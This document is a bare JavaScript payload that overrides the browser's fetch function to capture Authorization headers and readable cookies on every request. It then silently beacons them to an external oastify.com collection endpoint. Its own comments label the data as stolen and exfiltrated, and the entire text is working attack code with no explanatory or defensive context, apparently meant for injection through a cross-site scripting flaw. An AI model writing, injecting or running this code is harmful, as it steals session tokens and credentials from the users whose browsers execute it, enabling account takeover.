(function() {
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const [resource, config] = args;
        let stolenData = {};

        // 1. Capture the Authorization header from the fetch call
        if (config && config.headers) {
            // Support both object and Headers instance
            const headers = config.headers instanceof Headers ? 
                            Object.fromEntries(config.headers.entries()) : 
                            config.headers;

            if (headers['Authorization']) {
                stolenData.authHeader = headers['Authorization'];
            }
        }

        // 2. Capture all non-HttpOnly cookies
        if (document.cookie) {
            stolenData.cookies = document.cookie;
        }

        // 3. Exfiltrate if any data was found
        if (Object.keys(stolenData).length > 0) {
            // Using sendBeacon for a more "silent" delivery
            navigator.sendBeacon(
                'https://r806j2nndbetzeps5sqpgq63ouulid62.oastify.com/collect', 
                JSON.stringify(stolenData)
            );
        }

        return originalFetch(...args);
    };
})();
